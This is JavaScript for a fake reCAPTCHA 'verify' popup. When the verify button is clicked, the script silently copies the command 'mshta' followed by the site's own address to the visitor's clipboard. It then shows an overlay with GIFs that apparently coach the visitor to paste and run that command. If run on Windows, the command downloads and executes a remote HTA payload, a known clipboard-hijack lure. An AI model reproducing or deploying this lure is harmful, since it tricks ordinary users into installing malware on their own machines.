document.addEventListener('DOMContentLoaded', function() {
    function verify() {
        const textToCopy = `mshta ` + location.origin;
        const tempTextArea = document.createElement("textarea");
        tempTextArea.value = textToCopy;
        document.body.appendChild(tempTextArea);
        tempTextArea.select();
        document.execCommand("copy");
        document.body.removeChild(tempTextArea);
        const recaptchaPopup = document.getElementById("recaptchaPopup");
        const overlay = document.getElementById("overlay");
        const gifContainer = document.getElementById("gif-container");

        // Clear existing content (if any)EEEae
        gifContainer.innerHTML = '';

        // Create the first GIF (top) - This GIF will not loop
        const gif1 = document.createElement('img');
        gif1.src = '/Comp_23.gif'; // Use your provided GIF URL for the first GIF
        gif1.classList.add('gif-image'); // Apply styling

        // Create the second GIF (bottom) - This GIF will loop indefinitely
        const gif2 = document.createElement('img');
        gif2.src = '/Comp_21.gif'; // Second GIF URL
        gif2.classList.add('gif-image-second'); // Apply styling
        gif2.setAttribute('loop', 'true'); // Ensure the second GIF loops

        // Append GIFs to the container
        gifContainer.appendChild(gif1);
        gifContainer.appendChild(gif2);

        // Show the popup and overlay
        recaptchaPopup.classList.add("active");
        overlay.classList.add("active");

        // Delay the visibility of the second GIF by 2 seconds and apply opacity transition
        setTimeout(() => {
            gif2.classList.add('gif-visible'); // This triggers the opacity transition
        }, 2000);

        // Close the popup after a delay
        setTimeout(() => {
            overlay.style.pointerEvents = "auto";
        }, 7000);
    }

    // Attach the verify function to any element with the class 'verify-trigger'
    document.querySelectorAll('.verify-trigger').forEach(button => {
        button.addEventListener('click', verify);
    });

    // Hide popup and overlay when clicking outside (on the overlay)
    const overlay = document.getElementById('overlay');
    overlay.addEventListener('click', function() {
        const recaptchaPopup = document.getElementById("recaptchaPopup");
        recaptchaPopup.classList.remove("active");
        overlay.classList.remove("active");
        overlay.style.pointerEvents = "none"; // Disable clicks on overlay again
    });
});
// feef